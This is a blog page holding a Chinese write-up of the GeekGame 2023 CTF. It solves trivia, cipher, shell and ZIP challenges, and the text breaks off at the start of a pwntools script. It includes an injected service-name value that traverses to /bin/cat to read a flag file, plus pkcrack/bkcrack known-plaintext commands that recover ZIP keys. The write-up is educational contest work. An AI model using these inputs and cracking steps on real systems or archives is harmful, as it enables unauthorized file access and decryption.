<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>GeekGame 2023 题解 - GWDx</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<meta name="author" content="GWDx" /><meta name="description" content="第三届北京大学信息安全综合能力竞赛（GeekGame）题解
" /><meta name="keywords" content="GeekGame" />






<meta name="generator" content="Hugo 0.111.3 with theme even" />


<link rel="canonical" href="http://gwdx.github.io/post/geekgame2023/" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">



<link href="/sass/main.min.8c29ea812462215a64664d7cc3441ba352b84557e1a6a570ffaf5d74e70242a4.css" rel="stylesheet">
<link href="/lib/fancybox/jquery.fancybox-3.1.20.min.css" rel="stylesheet">


<meta property="og:title" content="GeekGame 2023 题解" />
<meta property="og:description" content="第三届北京大学信息安全综合能力竞赛（GeekGame）题解" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://gwdx.github.io/post/geekgame2023/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2023-10-21T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-06-28T22:46:41+08:00" />
<meta itemprop="name" content="GeekGame 2023 题解">
<meta itemprop="description" content="第三届北京大学信息安全综合能力竞赛（GeekGame）题解"><meta itemprop="datePublished" content="2023-10-21T00:00:00+00:00" />
<meta itemprop="dateModified" content="2024-06-28T22:46:41+08:00" />
<meta itemprop="wordCount" content="12026">
<meta itemprop="keywords" content="GeekGame,CTF," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="GeekGame 2023 题解"/>
<meta name="twitter:description" content="第三届北京大学信息安全综合能力竞赛（GeekGame）题解"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">GWDx</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">主页</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">归档</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">标签</li>
      </a><a href="/categories/">
        <li class="mobile-menu-item">分类</li>
      </a><a href="/about/">
        <li class="mobile-menu-item">关于</li>
      </a>
  </ul>

  


</nav>

  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="/" class="logo">GWDx</a>
</div>





<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="/">主页</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/post/">归档</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/tags/">标签</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/categories/">分类</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/about/">关于</a>
      </li>
  </ul>
</nav>

    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">GeekGame 2023 题解</h1>

      <div class="post-meta">
        <span class="post-time"> 2023-10-21 </span>
        
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Contents</h2>
  <div class="post-toc-content always-active">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#环境">环境</a></li>
    <li><a href="#tutorial">Tutorial</a>
      <ul>
        <li><a href="#1-一眼盯帧">1. 一眼盯帧</a></li>
        <li><a href="#2-小北问答">2. 小北问答</a></li>
      </ul>
    </li>
    <li><a href="#misc">Misc</a>
      <ul>
        <li><a href="#3-z-公司的服务器">3. Z 公司的服务器</a></li>
        <li><a href="#4-猫咪状态监视器第二阶段">4. 猫咪状态监视器（第二阶段）</a></li>
        <li><a href="#5-基本功">5. 基本功</a></li>
        <li><a href="#6-dark-room第二阶段">6. Dark Room（第二阶段）</a></li>
        <li><a href="#7-麦恩库拉夫特">7. 麦恩·库拉夫特</a></li>
      </ul>
    </li>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#8-emoji-wordle">8. Emoji Wordle</a></li>
        <li><a href="#9-第三新xss">9. 第三新XSS</a></li>
        <li><a href="#10-简单的打字稿">10. 简单的打字稿</a></li>
        <li><a href="#11-逝界计划第二阶段">11. 逝界计划（第二阶段）</a></li>
        <li><a href="#12-非法所得">12. 非法所得</a></li>
      </ul>
    </li>
    <li><a href="#binary">Binary</a>
      <ul>
        <li><a href="#13-汉化绿色版免费下载">13. 汉化绿色版免费下载</a></li>
        <li><a href="#14-初学-c-语言">14. 初学 C 语言</a></li>
        <li><a href="#15-baby-stack">15. Baby Stack</a></li>
        <li><a href="#16-绝妙的多项式">16. 绝妙的多项式</a></li>
      </ul>
    </li>
    <li><a href="#algorithm">Algorithm</a>
      <ul>
        <li><a href="#18-关键词过滤喵谢谢喵">18. 关键词过滤喵，谢谢喵</a></li>
        <li><a href="#21-小章鱼的曲奇">21. 小章鱼的曲奇</a></li>
      </ul>
    </li>
    <li><a href="#后记">后记</a></li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <p>第三届北京大学信息安全综合能力竞赛（GeekGame）题解</p>
<blockquote>
<p>题目及其余题解可以在 <a href="https://github.com/PKU-GeekGame/geekgame-3rd">PKU-GeekGame/geekgame-3rd</a> 中查看</p>
</blockquote>
<p>去年参加过 GeekGame，但后来摆烂了。今年得分 4218，总排名第 9</p>
<p>这次因为在 Pwn 上耗费了一些时间，有些 Misc 来不及做了。</p>
<p>最近事情有点多，所以题解写得比较随意……</p>
<h2 id="环境">环境</h2>
<ul>
<li>Debian Bookworm</li>
<li>Python 3.11</li>
<li>Ghidra（我的 IDA Free 坏掉了，不能反编译）</li>
</ul>
<h2 id="tutorial">Tutorial</h2>
<h3 id="1-一眼盯帧">1. 一眼盯帧</h3>
<blockquote>
<p>比赛前就看到题目名字是“一眼盯帧”，准备好了 Kdenlive，但还是没拿到第一。</p>
</blockquote>
<p>先读出 GIF 文件中的字符串：<code>synt{unirnavprtrrxtnzr}</code></p>
<p>这是凯撒密码，找一个<a href="http://moersima.00cha.net/kaisamima.asp">转换网站</a>。当偏移量为 13 时，得到 <code> flag{haveanicegeekgame}</code></p>
<br>
<h3 id="2-小北问答">2. 小北问答</h3>
<ol>
<li>
<p>GPT 帮我找到了 <a href="https://hpc.pku.edu.cn/_book/guide/slurm/sbatch.html">HPC 文档</a>，提交非交互式任务可以通过 <code>sbatch</code> 命令来完成。</p>
</li>
<li>
<p><a href="https://github.com/MiCode/Xiaomi_Kernel_OpenSource">Xiaomi_Kernel_OpenSource</a> 中提到，Redmi K60 Ultra 手机的内核的仓库位于 <a href="https://github.com/MiCode/Xiaomi_Kernel_OpenSource/tree/corot-t-oss">corot-t-oss</a> 分支，其中的 <code>Makefile</code> 记录了版本为 <code>5.15.78</code></p>
</li>
<li>
<p>GPT 找到了<a href="https://everymac.com/systems/apple/apple-watch/specs/apple-watch-series-8-gps-cellular-41mm-global-international-a2773.html">Apple Watch Series 8（蜂窝网络、全球、41 毫米）规格</a>，版本号是 <code>Watch6,16</code></p>
</li>
<li>
<p>找到 <a href="https://github.com/PKU-GeekGame/gs-backend">PKU-GeekGame/gs-backend</a>，其提交时间是 2023 年 10 月，其中的 <code>src/store/user_profile_store.py</code> 记录了计算方法，用以下代码在 <code>Python 3.8</code> 上运行可以得到禁止的字符数是 <code>4445</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">TYPE_CHECKING</span><span class="p">,</span> <span class="n">Optional</span><span class="p">,</span> <span class="n">Set</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">unicategories</span> <span class="kn">import</span> <span class="n">categories</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unicode_chars</span><span class="p">(</span><span class="o">*</span><span class="n">cats</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Set</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">cat</span> <span class="ow">in</span> <span class="n">cats</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">ret</span> <span class="o">|=</span> <span class="nb">set</span><span class="p">(</span><span class="n">categories</span><span class="p">[</span><span class="n">cat</span><span class="p">]</span><span class="o">.</span><span class="n">characters</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">EMOJI_CHARS</span> <span class="o">=</span> <span class="p">({</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x200d</span><span class="p">)}</span>  <span class="c1"># zwj</span>
</span></span><span class="line"><span class="cl">               <span class="o">|</span> <span class="p">{</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x200b</span><span class="p">)}</span>  <span class="c1"># zwsp, to break emoji componenets into independent chars</span>
</span></span><span class="line"><span class="cl">               <span class="o">|</span> <span class="p">{</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x20e3</span><span class="p">)}</span>  <span class="c1"># keycap</span>
</span></span><span class="line"><span class="cl">               <span class="o">|</span> <span class="p">{</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                  <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xfe00</span><span class="p">,</span> <span class="mh">0xfe0f</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)}</span>  <span class="c1"># variation selector</span>
</span></span><span class="line"><span class="cl">               <span class="o">|</span> <span class="p">{</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                  <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xe0020</span><span class="p">,</span> <span class="mh">0xe007f</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)}</span>  <span class="c1"># tag</span>
</span></span><span class="line"><span class="cl">               <span class="o">|</span> <span class="p">{</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                  <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x1f1e6</span><span class="p">,</span> <span class="mh">0x1f1ff</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)}</span>  <span class="c1"># regional indicator</span>
</span></span><span class="line"><span class="cl">               <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">DISALLOWED_CHARS</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">unicode_chars</span><span class="p">(</span><span class="s1">&#39;Cc&#39;</span><span class="p">,</span> <span class="s1">&#39;Cf&#39;</span><span class="p">,</span> <span class="s1">&#39;Cs&#39;</span><span class="p">,</span> <span class="s1">&#39;Mc&#39;</span><span class="p">,</span> <span class="s1">&#39;Me&#39;</span><span class="p">,</span> <span class="s1">&#39;Mn&#39;</span><span class="p">,</span> <span class="s1">&#39;Zl&#39;</span><span class="p">,</span> <span class="s1">&#39;Zp&#39;</span><span class="p">)</span>  <span class="c1"># control and modifier chars</span>
</span></span><span class="line"><span class="cl">    <span class="o">|</span> <span class="p">{</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">       <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x12423</span><span class="p">,</span> <span class="mh">0x12431</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)}</span>  <span class="c1"># too long</span>
</span></span><span class="line"><span class="cl">    <span class="o">|</span> <span class="p">{</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x0d78</span><span class="p">)}</span>  <span class="c1"># too long</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="o">-</span> <span class="n">EMOJI_CHARS</span>
</span></span><span class="line"><span class="cl"><span class="n">WHITESPACE_CHARS</span> <span class="o">=</span> <span class="n">unicode_chars</span><span class="p">(</span><span class="s1">&#39;Zs&#39;</span><span class="p">)</span> <span class="o">|</span> <span class="n">EMOJI_CHARS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">DISALLOWED_CHARS</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p><a href="https://zh.wikipedia.org/zh-hans/Bilibili">Wiki</a> 上得到，2011 年 1 月，Bilibili 的域名是 <code>bilibili.us</code>。用 Web Archive 查到 <a href="https://web.archive.org/web/20110122012044/http://bilibili.us/video/game.html">游戏区的页面</a>，子分区有 <code>游戏视频,游戏攻略·解说,Mugen,flash游戏</code></p>
</li>
<li>
<p>图中包含了 <code>sponsor 启迪控股 清华科技园 中关村 konza kacst</code> 等文字，用 Google 查到这是 <a href="http://www.iaspbo.com.cn/contents/2/533">2023 年卢森堡 IASP 世界大会</a>，由 <a href="https://www.iaspworldconference.com/conference/venue/">地点 - IASP</a>，举办地点是卢森堡欧洲会议中心 (ECCL) ，但 <code>eccl.lu</code> 不是答案，用 Google Map 发现它旁边有卢森堡音乐厅（Philharmonie Luxembourg），网址是 <code>philharmonie.lu</code></p>
</li>
</ol>
<br>
<h2 id="misc">Misc</h2>
<h3 id="3-z-公司的服务器">3. Z 公司的服务器</h3>
<h4 id="服务器">服务器</h4>
<p>直接打开网站链接发现不行，用 <code>nc prob05.geekgame.pku.edu.cn 10005</code> 后 Konsole 提示需要安装 <code>lrzsz</code>，<code>apt</code> 安装后即可接收文件</p>
<br>
<h3 id="4-猫咪状态监视器第二阶段">4. 猫咪状态监视器（第二阶段）</h3>
<p>服务器运行的代码如下。只有 <code>STATUS</code> 可以输入一些内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Command: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&#34;LIST&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;/usr/sbin/service --status-all&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&#34;STATUS&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">service_name</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Service name: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;/usr/sbin/service </span><span class="si">{}</span><span class="s2"> status&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">service_name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&#34;EXIT&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Unknown command...&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>按照提示查看 <code>/usr/sbin/service</code> 的代码，发现是直接用路径判断文件是否存在的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">run_via_sysvinit<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">   <span class="c1"># Otherwise, use the traditional sysvinit</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="o">[</span> -x <span class="s2">&#34;</span><span class="si">${</span><span class="nv">SERVICEDIR</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">SERVICE</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">      <span class="nb">exec</span> env -i <span class="nv">LANG</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LANG</span><span class="s2">&#34;</span> <span class="nv">LANGUAGE</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LANGUAGE</span><span class="s2">&#34;</span> <span class="nv">LC_CTYPE</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LC_CTYPE</span><span class="s2">&#34;</span> <span class="nv">LC_NUMERIC</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LC_NUMERIC</span><span class="s2">&#34;</span> <span class="nv">LC_TIME</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LC_TIME</span><span class="s2">&#34;</span> <span class="nv">LC_COLLATE</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LC_COLLATE</span><span class="s2">&#34;</span> <span class="nv">LC_MONETARY</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LC_MONETARY</span><span class="s2">&#34;</span> <span class="nv">LC_MESSAGES</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LC_MESSAGES</span><span class="s2">&#34;</span> <span class="nv">LC_PAPER</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LC_PAPER</span><span class="s2">&#34;</span> <span class="nv">LC_NAME</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LC_NAME</span><span class="s2">&#34;</span> <span class="nv">LC_ADDRESS</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LC_ADDRESS</span><span class="s2">&#34;</span> <span class="nv">LC_TELEPHONE</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LC_TELEPHONE</span><span class="s2">&#34;</span> <span class="nv">LC_MEASUREMENT</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LC_MEASUREMENT</span><span class="s2">&#34;</span> <span class="nv">LC_IDENTIFICATION</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LC_IDENTIFICATION</span><span class="s2">&#34;</span> <span class="nv">LC_ALL</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$LC_ALL</span><span class="s2">&#34;</span> <span class="nv">PATH</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$PATH</span><span class="s2">&#34;</span> <span class="nv">TERM</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$TERM</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$SERVICEDIR</span><span class="s2">/</span><span class="nv">$SERVICE</span><span class="s2">&#34;</span> <span class="si">${</span><span class="nv">ACTION</span><span class="si">}</span> <span class="si">${</span><span class="nv">OPTIONS</span><span class="si">}</span>
</span></span><span class="line"><span class="cl">   <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="nb">echo</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">SERVICE</span><span class="si">}</span><span class="s2">: unrecognized service&#34;</span> &gt;<span class="p">&amp;</span><span class="m">2</span>
</span></span><span class="line"><span class="cl">      <span class="nb">exit</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">   <span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>SERVICEDIR</code> 是在 <code>/etc/init.d</code>。所以用以下 <code>name</code> 读取内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">../../bin/cat /flag.txt <span class="c1">#</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br>
<h3 id="5-基本功">5. 基本功</h3>
<h4 id="简单的-flag">简单的 Flag</h4>
<p>ZIP 压缩包里有 <code>chromedriver_linux64.zip</code>，用 <code>zipinfo</code> 得到文件大小为 5845152。找到版本为 <code>89.0.4389.23</code>，下载 <a href="https://chromedriver.storage.googleapis.com/index.html?path=89.0.4389.23/">相应文件</a></p>
<p><a href="https://ctf-wiki.org/misc/archive/zip/">ZIP 格式 - CTF Wiki</a> 上说使用 PKCrack 可以明文攻击</p>
<p>首先要建一个同样是 Store 压缩方式的压缩文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zip -0 archive.zip chromedriver_linux64.zip
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后用 <a href="https://github.com/keyunluo/pkcrack">pkcrack</a> 得到破解后的文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./pkcrack -C challenge_1.zip -c chromedriver_linux64.zip -P archive.zip -p chromedriver_linux64.zip -d out -a
</span></span></code></pre></td></tr></table>
</div>
</div><p>解压得到 <code>flag{Insecure Zip Crypto From Any Known File Content}</code></p>
<h4 id="冷酷的-flag">冷酷的 Flag</h4>
<p>网上看到 <a href="https://www.bilibili.com/video/BV1iG411A7yJ/">利用 bkcrack 对 zip 压缩包进行明文攻击 bilibili</a></p>
<p>这题压缩包内是 <a href="https://pcapng.com/">pcapng</a> 文件，其文件格式有一定规律。而只需要 12 字节就能使用 <a href="https://github.com/kimci86/bkcrack">bkcrack</a></p>
<p>看了一些 pcapng 文件，感觉第 8 个字节开始比较确定。用十六进制编辑器 Okteta 创建文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4D 3C 2B 1A 01 00 00 00 FF FF FF FF FF FF FF FF
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后运行 bkcrack</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./bkcrack -C challenge_2.zip -c flag2.pcapng -p 2.bin -o <span class="m">8</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>得到密钥，然后重新创建压缩文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./bkcrack -C challenge_2.zip -k 3158685f 64b8296b 052722e2 -U result.zip <span class="m">123</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>解压，查看文件，得到 <code>flag{inSecUre-zIP-crYPtO-eveN-withOuT-KNOwN-fiLe-CoNtENT}</code></p>
<br>
<h3 id="6-dark-room第二阶段">6. Dark Room（第二阶段）</h3>
<h4 id="flag-1">Flag 1</h4>
<p>先玩一遍，要求 san 值在 117 以上就能拿到 flag1</p>
<p>查看 <a href="https://github.com/tinichu316/Dark_Room">游戏源码</a></p>
<p>找到两种钥匙、吃东西、找到及使用戒指都能增加 san 值。help 有 20% 的概率加 10 san 值，但更可能扣 10 san 值。</p>
<p>把所有的物品集齐到达终点前只有 91 的 san 值。</p>
<p>所以只能靠概率，连续三次 help 成功就可以达到目标</p>
<p>写了个交互脚本：</p>
<details open>
<summary>代码</summary>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
